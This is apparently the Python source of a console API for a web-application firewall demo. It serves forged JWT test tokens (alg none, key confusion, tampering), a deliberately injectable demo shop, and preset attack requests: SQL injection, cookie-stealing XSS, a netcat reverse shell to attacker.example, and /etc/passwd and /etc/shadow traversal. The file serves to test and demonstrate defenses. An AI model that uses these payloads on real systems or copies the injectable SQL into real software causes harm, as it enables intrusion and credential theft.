"""CSF Console API -- a thin companion service for the frontend.

Adds NO code to ``backend/``. It imports the real ``csf`` package, builds the
real gateway (S0 framing + JWT auth, S2 semantic, S4 decision engine) in the
same process and exposes read/inspect endpoints the dashboard needs:

    :3000  demo "shop" upstream (deliberately naive; the thing being protected)
    :8080  the real CSF gateway (enforce mode by default)
    :8000  console API (this file's Starlette app) -- what the frontend calls

Run from ``backend/``:   uv run python ../console-api/server.py
"""

from __future__ import annotations

import asyncio
import base64
import os
import collections
import hashlib
import hmac
import json
import logging
import time
from pathlib import Path
from typing import Any

import httpx
import jwt
import uvicorn
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from starlette.applications import Starlette
from starlette.middleware import Middleware
from starlette.middleware.cors import CORSMiddleware
from starlette.requests import Request
from starlette.responses import JSONResponse, PlainTextResponse
from starlette.routing import Route

from csf.config import AuthConfig, Config, IssuerSettings, S1Settings, S2Settings
from csf.decision import DecisionEngine, StageEvidence
from csf.extraction import extract
from csf.main import build_app
from csf.telemetry import Mode
from csf.verdict import Decision

ROOT = Path(__file__).resolve().parent.parent
RUNTIME = Path(__file__).resolve().parent / ".runtime"
BENCH_DIR = ROOT / "docs" / "benchmarks"

GATEWAY = "http://127.0.0.1:8080"
ISSUER = "https://csf.demo/"
AUDIENCE = "csf-api"
KID = "demo-1"
# 0.0.0.0 inside a container so the published port works; loopback otherwise.
BIND = os.environ.get("CSF_CONSOLE_BIND", "127.0.0.1")

# --------------------------------------------------------------------------
# Demo keys + token factory
# --------------------------------------------------------------------------

_PRIVATE = rsa.generate_private_key(public_exponent=65537, key_size=2048)
_PUBLIC_PEM = _PRIVATE.public_key().public_bytes(
    serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo)
_PRIVATE_PEM = _PRIVATE.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())
_ATTACKER = rsa.generate_private_key(public_exponent=65537, key_size=2048)
_ATTACKER_PEM = _ATTACKER.private_bytes(
    serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8,
    serialization.NoEncryption())


def _b64(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def _claims(**over: Any) -> dict[str, Any]:
    now = int(time.time())
    base = {"iss": ISSUER, "aud": AUDIENCE, "sub": "alice", "iat": now,
            "nbf": now - 5, "exp": now + 600, "role": "user"}
    base.update(over)
    return base


def _rs256(claims: dict[str, Any], key: bytes = _PRIVATE_PEM, kid: str = KID) -> str:
    return jwt.encode(claims, key, algorithm="RS256", headers={"kid": kid})


def make_tokens() -> list[dict[str, str]]:
    valid = _rs256(_claims())
    head, payload, sig = valid.split(".")
    forged_payload = _b64(json.dumps(_claims(sub="admin", role="admin")).encode())

    hs_head = _b64(json.dumps({"alg": "HS256", "typ": "JWT", "kid": KID}).encode())
    hs_body = _b64(json.dumps(_claims(sub="admin", role="admin")).encode())
    hs_sig = _b64(hmac.new(_PUBLIC_PEM, f"{hs_head}.{hs_body}".encode(),
                           hashlib.sha256).digest())
    none_head = _b64(json.dumps({"alg": "none", "typ": "JWT", "kid": KID}).encode())

    return [
        {"id": "valid", "label": "Valid RS256 token", "expect": "allow",
         "attack": "none", "token": valid,
         "note": "Signed with the issuer's key. Correct iss/aud/exp."},
        {"id": "expired", "label": "Expired token", "expect": "block",
         "attack": "Replay of a stale token",
         "token": _rs256(_claims(iat=1, nbf=1, exp=60)),
         "note": "Signature is good, but exp is in 1970."},
        {"id": "alg_none", "label": "alg: none", "expect": "block",
         "attack": "Signature stripping (CVE-2015-9235 class)",
         "token": f"{none_head}.{hs_body}.",
         "note": "Header claims no signature is needed."},
        {"id": "key_confusion", "label": "RS256 -> HS256 key confusion",
         "expect": "block", "attack": "Algorithm confusion (RFC 8725 s2.1)",
         "token": f"{hs_head}.{hs_body}.{hs_sig}",
         "note": "HMAC-signed using the server's RSA public key as the secret."},
        {"id": "tampered", "label": "Tampered payload (sub=admin)",
         "expect": "block", "attack": "Privilege escalation by claim edit",
         "token": f"{head}.{forged_payload}.{sig}",
         "note": "Payload swapped after signing; the signature no longer matches."},
        {"id": "wrong_key", "label": "Signed with attacker's key",
         "expect": "block", "attack": "Forgery with own key, honest kid",
         "token": _rs256(_claims(sub="admin"), key=_ATTACKER_PEM),
         "note": "Perfectly formed RS256 token, wrong private key."},
        {"id": "unknown_kid", "label": "Unknown kid", "expect": "block",
         "attack": "Key-id injection", "token": _rs256(_claims(), kid="evil-key"),
         "note": "kid not in the issuer's allowlist."},
        {"id": "wrong_aud", "label": "Wrong audience", "expect": "block",
         "attack": "Token for another service",
         "token": _rs256(_claims(aud="some-other-api")),
         "note": "Valid token minted for a different audience."},
        {"id": "wrong_iss", "label": "Untrusted issuer", "expect": "block",
         "attack": "Token from an unknown issuer",
         "token": _rs256(_claims(iss="https://evil.example/")),
         "note": "Issuer is not configured."},
    ]


# --------------------------------------------------------------------------
# Demo upstream: a naive shop (stands in for the vulnerable app)
# --------------------------------------------------------------------------

async def shop_app(scope: dict[str, Any], receive: Any, send: Any) -> None:
    if scope["type"] != "http":
        return
    body = b""
    while True:
        msg = await receive()
        body += msg.get("body", b"")
        if not msg.get("more_body"):
            break
    path = scope["path"]
    query = scope.get("query_string", b"").decode("latin-1")
    hdr = {k.decode(): v.decode() for k, v in scope["headers"]}
    payload: dict[str, Any] = {
        "app": "demo-shop (intentionally naive)", "path": path,
        "raw_query": query, "raw_body": body.decode("utf-8", "replace")[:500],
        "asserted_subject": hdr.get("x-csf-subject"),
    }
    if path.startswith("/admin") or path.startswith("/api/internal"):
        payload["secret"] = "ADMIN PANEL: user table, API keys, db credentials"
    elif path == "/search":
        payload["sql_it_would_run"] = (
            f"SELECT * FROM products WHERE name LIKE '%{query}%'")
    data = json.dumps(payload).encode()
    await send({"type": "http.response.start", "status": 200,
                "headers": [(b"content-type", b"application/json"),
                            (b"content-length", str(len(data)).encode())]})
    await send({"type": "http.response.body", "body": data})


# --------------------------------------------------------------------------
# Event capture
# --------------------------------------------------------------------------

EVENTS: collections.deque[dict[str, Any]] = collections.deque(maxlen=2000)
_SEQ = 0
# request_id -> what we sent (the audit log never contains payloads)
SENT: dict[str, dict[str, Any]] = {}


class _Capture(logging.Handler):
    def emit(self, record: logging.LogRecord) -> None:
        global _SEQ
        fields = getattr(record, "fields", None)
        if record.getMessage() != "decision" or not isinstance(fields, dict):
            return
        _SEQ += 1
        ev = {"seq": _SEQ, "ts": time.time(), **fields}
        sent = SENT.get(fields.get("request_id", ""))
        if sent:
            ev["payload"] = sent
        EVENTS.append(ev)


# --------------------------------------------------------------------------
# State
# --------------------------------------------------------------------------

class State:
    gateway: Any = None
    started = time.time()


S = State()


def _build_config() -> Config:
    RUNTIME.mkdir(exist_ok=True)
    pem = RUNTIME / "demo-public.pem"
    pem.write_bytes(_PUBLIC_PEM)
    cfg = Config()
    cfg.upstream = "http://127.0.0.1:3000"
    cfg.mode = Mode.ENFORCE
    cfg.log_json = True
    cfg.s2 = S2Settings(enabled=True)
    # S1 (Coraza/CRS) is reachable only from the docker stack, over a unix
    # socket shared with the Go sidecar container.
    if os.environ.get("CSF_S1_SOCKET"):
        cfg.s1 = S1Settings(enabled=True, socket_path=os.environ["CSF_S1_SOCKET"])
    cfg.auth = AuthConfig(
        enabled=True, protected_prefixes=("/admin", "/api/internal"),
        fail_closed=True,
        issuers=(IssuerSettings(issuer=ISSUER, audience=AUDIENCE,
                                allowed_algs=("RS256",),
                                static_keys={KID: str(pem)}),))
    cfg.validate()
    return cfg


# --------------------------------------------------------------------------
# Console endpoints
# --------------------------------------------------------------------------

def _gw() -> Any:
    return S.gateway


async def api_status(_: Request) -> JSONResponse:
    gw = _gw()
    return JSONResponse({
        "mode": str(gw._opts.mode),
        "uptime_s": int(time.time() - S.started),
        "stats": gw.stats.snapshot(),
        "decision": gw.decision_engine.snapshot(),
        "enforcement_blockers": gw.decision_engine.enforcement_blockers(),
        "circuit_breaker": gw.circuit_breaker.snapshot(),
        "rate_limit": gw.rate_limiter.snapshot(),
        "stages": [
            {"id": "s0_framing", "label": "S0 Framing", "enabled": True},
            {"id": "s0_auth", "label": "S0 JWT auth", "enabled": True},
            {"id": "s1_rules", "label": "S1 CRS rules (Coraza)",
             "enabled": bool(os.environ.get("CSF_S1_SOCKET")),
             "note": "needs the Go sidecar (docker compose)"},
            {"id": "s2_semantic", "label": "S2 Semantic parse", "enabled": True},
            {"id": "s3_model", "label": "S3 Learned", "enabled": False,
             "note": "off by default (documented negative result, ADR-0017)"},
            {"id": "s4_decision", "label": "S4 Decision", "enabled": True},
        ],
    })


async def api_events(request: Request) -> JSONResponse:
    since = int(request.query_params.get("since", 0))
    limit = int(request.query_params.get("limit", 200))
    out = [e for e in EVENTS if e["seq"] > since][-limit:]
    return JSONResponse({"events": out, "latest": _SEQ})


async def api_mode(request: Request) -> JSONResponse:
    body = await request.json()
    try:
        mode = Mode(body.get("mode"))
    except ValueError:
        return JSONResponse({"error": "mode must be shadow|monitor|enforce|emergency"},
                            status_code=400)
    _gw()._opts.mode = mode
    return JSONResponse({"mode": str(mode)})


async def api_tokens(_: Request) -> JSONResponse:
    return JSONResponse({"issuer": ISSUER, "audience": AUDIENCE,
                         "tokens": make_tokens()})


async def api_reset(_: Request) -> JSONResponse:
    EVENTS.clear()
    SENT.clear()
    gw = _gw()
    for k in vars(type(gw.stats)).get("__slots__", ()):
        setattr(gw.stats, k, 0)
    gw.decision_engine.__init__(gw._opts.decision)  # type: ignore[misc]
    return JSONResponse({"ok": True})


async def api_benchmarks(_: Request) -> JSONResponse:
    out: dict[str, Any] = {}
    for p in sorted(BENCH_DIR.glob("*.json")):
        try:
            out[p.stem] = json.loads(p.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
    return JSONResponse(out)


def _raw_headers(h: dict[str, str]) -> list[tuple[bytes, bytes]]:
    return [(k.lower().encode("latin-1"), str(v).encode("latin-1"))
            for k, v in h.items()]


async def api_analyze(request: Request) -> JSONResponse:
    """Dry-run the detection cascade on a request: per-stage verdicts and
    timings, using a throwaway decision engine so live counters are untouched.
    Auth is not part of this view (it needs the live key); use /api/send."""
    spec = await request.json()
    gw = _gw()
    method = spec.get("method", "GET").upper()
    path = spec.get("path", "/")
    query = (spec.get("query") or "").lstrip("?")
    body = (spec.get("body") or "").encode()
    headers = {"host": "demo", **(spec.get("headers") or {})}
    if body and "content-type" not in {k.lower() for k in headers}:
        headers["content-type"] = "application/x-www-form-urlencoded"
    t0 = time.perf_counter()
    extracted = extract(method, path, query.encode(), _raw_headers(headers), body,
                        gw._opts.extraction_limits)
    extract_us = int((time.perf_counter() - t0) * 1e6)

    engine = DecisionEngine(gw._opts.decision)
    evidence: list[StageEvidence] = []
    stages: list[dict[str, Any]] = []
    skipped = False
    for det in gw._opts.detectors:
        if skipped:
            stages.append({"stage": str(det.name), "status": "skipped"})
            continue
        t = time.perf_counter()
        v = await det.evaluate(extracted)
        us = int((time.perf_counter() - t) * 1e6)
        evidence.append(StageEvidence(det.name, v.decision, v.score, v.reason))
        stages.append({"stage": str(det.name), "status": "run",
                       "decision": str(v.decision), "score": v.score,
                       "reason": v.reason, "latency_us": us})
        if not engine.defers(v):
            skipped = True
    outcome = engine.decide(evidence, ())
    return JSONResponse({
        "candidates": [{"location": str(c.location), "parameter": c.parameter,
                        "original": c.original[:200], "normalized": c.normalized[:200],
                        "flags": [str(f) for f in c.flags]}
                       for c in list(getattr(extracted, "candidates", []))[:20]],
        "extract_us": extract_us,
        "stages": stages,
        "final": {"decision": str(outcome.decision), "stage": str(outcome.stage),
                  "reason": outcome.reason, "score": outcome.score},
    })


async def api_send(request: Request) -> JSONResponse:
    """Send a real request through the live gateway on :8080."""
    spec = await request.json()
    method = spec.get("method", "GET").upper()
    path = spec.get("path", "/")
    query = (spec.get("query") or "").lstrip("?")
    body = spec.get("body") or ""
    headers = dict(spec.get("headers") or {})
    token = spec.get("token")
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if body and "content-type" not in {k.lower() for k in headers}:
        headers["Content-Type"] = "application/x-www-form-urlencoded"
    url = GATEWAY + path + (f"?{query}" if query else "")
    t0 = time.perf_counter()
    try:
        async with httpx.AsyncClient(timeout=10) as c:
            r = await c.request(method, url, headers=headers,
                                content=body.encode() if body else None)
    except httpx.HTTPError as exc:
        return JSONResponse({"error": f"gateway unreachable: {exc}"}, status_code=502)
    ms = (time.perf_counter() - t0) * 1000
    rid = r.headers.get("x-csf-request-id", "")
    SENT[rid] = {"method": method, "path": path, "query": query, "body": body,
                 "has_token": bool(token)}
    await asyncio.sleep(0.02)
    ev = next((e for e in reversed(EVENTS) if e.get("request_id") == rid), None)
    if ev is not None:
        ev["payload"] = SENT[rid]
    return JSONResponse({
        "status": r.status_code, "request_id": rid, "latency_ms": round(ms, 2),
        "response_body": r.text[:1500], "event": ev,
        "reached_app": r.status_code < 400,
    })


async def api_presets(_: Request) -> JSONResponse:
    P = [
        ("Benign", "Normal search", "GET", "/search", "q=blue+running+shoes", ""),
        ("Benign", "Login form", "POST", "/login", "", "user=alice&password=Sup3rS3cret"),
        ("Benign", "Apostrophe in a name", "GET", "/search", "q=O'Brien+bookstore", ""),
        ("SQL injection", "Classic tautology", "GET", "/search", "q=' OR '1'='1", ""),
        ("SQL injection", "UNION exfiltration", "GET", "/search",
         "q=x' UNION SELECT username,password FROM users--", ""),
        ("SQL injection", "Comment-obfuscated", "GET", "/search",
         "q=1'/**/UnIoN/**/SeLeCt/**/password/**/FROM/**/users--", ""),
        ("SQL injection", "URL-encoded", "GET", "/search",
         "q=%27%20OR%201%3D1%20--%20", ""),
        ("SQL injection", "Stacked query", "POST", "/login", "",
         "user=admin'; DROP TABLE users;--&password=x"),
        ("XSS", "Script tag", "GET", "/search",
         "q=<script>alert(document.cookie)</script>", ""),
        ("XSS", "Event handler", "GET", "/search", "q=<img src=x onerror=alert(1)>", ""),
        ("XSS", "javascript: URI", "GET", "/search",
         "q=<a href=\"javascript:alert(1)\">x</a>", ""),
        ("Command injection", "Semicolon chain", "GET", "/search",
         "q=shoes; cat /etc/passwd", ""),
        ("Command injection", "Subshell", "GET", "/search", "q=$(whoami)", ""),
        ("Command injection", "Pipe to nc", "POST", "/login", "",
         "user=a | nc attacker.example 4444 -e /bin/sh&password=x"),
        ("Path traversal", "Dot-dot-slash", "GET", "/search",
         "q=../../../../etc/passwd", ""),
        ("Path traversal", "Encoded traversal", "GET", "/search",
         "q=..%2f..%2f..%2fetc%2fshadow", ""),
    ]
    return JSONResponse([
        {"group": g, "label": lbl, "method": m, "path": p, "query": q, "body": b}
        for g, lbl, m, p, q, b in P])


async def api_health(_: Request) -> PlainTextResponse:
    return PlainTextResponse("ok")


routes = [
    Route("/api/health", api_health),
    Route("/api/status", api_status),
    Route("/api/events", api_events),
    Route("/api/mode", api_mode, methods=["POST"]),
    Route("/api/tokens", api_tokens),
    Route("/api/reset", api_reset, methods=["POST"]),
    Route("/api/benchmarks", api_benchmarks),
    Route("/api/analyze", api_analyze, methods=["POST"]),
    Route("/api/send", api_send, methods=["POST"]),
    Route("/api/presets", api_presets),
]
console_app = Starlette(routes=routes, middleware=[
    Middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"],
               allow_headers=["*"])])


async def amain() -> None:
    cfg = _build_config()
    gateway, _auth = await build_app(cfg)
    logging.getLogger("csf").addHandler(_Capture())
    # keep stdout quiet: the dashboard is the audit view
    for h in logging.getLogger("csf").handlers:
        if isinstance(h, logging.StreamHandler) and not isinstance(h, _Capture):
            h.setLevel(logging.WARNING)
    S.gateway = gateway

    def srv(app: Any, port: int, host: str = "127.0.0.1") -> uvicorn.Server:
        return uvicorn.Server(uvicorn.Config(
            app, host=host, port=port, log_level="warning", access_log=False))

    await asyncio.gather(
        srv(shop_app, 3000).serve(),
        srv(gateway, 8080).serve(),
        srv(console_app, 8000, BIND).serve(),
    )


if __name__ == "__main__":
    asyncio.run(amain())
